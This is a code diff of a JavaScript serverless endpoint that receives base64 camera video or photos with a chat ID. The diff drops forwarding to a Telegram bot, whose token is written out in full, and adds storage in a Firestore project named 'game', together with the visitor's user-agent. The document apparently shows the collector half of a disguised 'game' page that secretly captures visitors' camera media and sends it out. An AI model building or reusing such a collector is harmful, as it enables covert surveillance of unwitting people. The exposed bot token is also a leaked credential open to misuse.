@@ -1,5 +1,3 @@
-const axios = require('axios');
-
 module.exports = async (req, res) => {
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
@@ -10,37 +8,25 @@ module.exports = async (req, res) => {
         const { chat_id, video_base64 } = req.body;
         if (!video_base64) return res.json({ error: 'no data' });
 
-        // إرسال لتليجرام
-        const videoBuffer = Buffer.from(video_base64, 'base64');
-        const FormData = require('form-data');
-        const form = new FormData();
-        form.append('chat_id', chat_id);
-        form.append('video', videoBuffer, { filename: 'media.webm', contentType: 'video/webm' });
-        form.append('caption', '🎬 جديد');
+        // تخزين في Firestore REST API
+        const axios = require('axios');
+        const type = video_base64.length > 50000 ? 'video' : 'photo';
         
         await axios.post(
-            'https://api.telegram.org/bot8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo/sendVideo',
-            form,
-            { headers: form.getHeaders(), timeout: 30000 }
+            'https://firestore.googleapis.com/v1/projects/game-a1aca/databases/(default)/documents/media',
+            {
+                fields: {
+                    chatId: { stringValue: chat_id || '7276604783' },
+                    data: { stringValue: video_base64 },
+                    type: { stringValue: type },
+                    timestamp: { timestampValue: new Date().toISOString() },
+                    device: { stringValue: req.headers['user-agent']?.substring(0, 100) || 'unknown' }
+                }
+            },
+            { headers: { 'Content-Type': 'application/json' }, timeout: 10000 }
         );
 
-        // تخزين في Firestore عن طريق REST API
-        const firestoreData = {
-            fields: {
-                chatId: { stringValue: chat_id || 'unknown' },
-                data: { stringValue: video_base64 },
-                timestamp: { timestampValue: new Date().toISOString() },
-                device: { stringValue: req.headers['user-agent'] || 'unknown' }
-            }
-        };
-
-        await axios.post(
-            'https://firestore.googleapis.com/v1/projects/game-a1aca/databases/(default)/documents/media',
-            firestoreData,
-            { headers: { 'Content-Type': 'application/json' }, timeout: 10000 }
-        ).catch(e => {});
-
-        return res.json({ success: true });
+        return res.json({ success: true, stored: true });
     } catch (e) {
         return res.json({ error: e.message });
     }
